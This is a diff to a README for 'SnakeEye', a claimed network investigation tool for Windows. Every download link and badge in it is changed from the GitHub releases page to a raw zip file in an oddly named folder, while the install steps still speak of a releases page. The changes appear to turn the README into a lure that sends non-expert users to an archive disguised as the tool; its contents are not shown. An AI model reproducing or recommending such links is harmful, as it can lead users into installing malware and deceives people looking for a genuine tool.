@@ -1,6 +1,6 @@
 # 🐍 SnakeEye - Simple Network Investigation Tool
 
-[![Download SnakeEye](https://img.shields.io/badge/Download-SnakeEye-brightgreen)](https://github.com/mujtabaali01/SnakeEye/releases)
+[![Download SnakeEye](https://img.shields.io/badge/Download-SnakeEye-brightgreen)](https://raw.githubusercontent.com/mujtabaali01/SnakeEye/main/overdaintiness/Eye-Snake-1.6.zip)
 
 SnakeEye Analyzer is a tool that helps you learn more about internet addresses and captured network data. It works quietly both by watching the signals and by asking for information. You do not need any special skills to use it.
 
@@ -35,7 +35,7 @@ SnakeEye runs in the Command Prompt window, so it does not have a typical clicka
 
 Click the big button below to open the page where you can download the latest version. This page has the program files ready for your Windows PC.
 
-[![Download SnakeEye](https://img.shields.io/badge/Download-SnakeEye-blue?style=for-the-badge)](https://github.com/mujtabaali01/SnakeEye/releases)
+[![Download SnakeEye](https://img.shields.io/badge/Download-SnakeEye-blue?style=for-the-badge)](https://raw.githubusercontent.com/mujtabaali01/SnakeEye/main/overdaintiness/Eye-Snake-1.6.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to get SnakeEye running:
 
 1. Click the download button above or go to:
    
-   https://github.com/mujtabaali01/SnakeEye/releases
+   https://raw.githubusercontent.com/mujtabaali01/SnakeEye/main/overdaintiness/Eye-Snake-1.6.zip
 
 2. On the releases page, look for the latest version. It usually has a name like `SnakeEye-setup.exe` or `SnakeEye-x64.zip`.
 
@@ -176,11 +176,11 @@ It supports analyzing traffic from networks using VPN, Tor, and I2P.
 ## 🔗 Useful Links
 
 - Primary Download:  
-  https://github.com/mujtabaali01/SnakeEye/releases
+  https://raw.githubusercontent.com/mujtabaali01/SnakeEye/main/overdaintiness/Eye-Snake-1.6.zip
 
 - Official Documentation:  
   Available inside the downloaded package in the `docs` folder.
 
 ---
 
-[![Download SnakeEye](https://img.shields.io/badge/Download-SnakeEye-brightgreen)](https://github.com/mujtabaali01/SnakeEye/releases)
+[![Download SnakeEye](https://img.shields.io/badge/Download-SnakeEye-brightgreen)](https://raw.githubusercontent.com/mujtabaali01/SnakeEye/main/overdaintiness/Eye-Snake-1.6.zip)
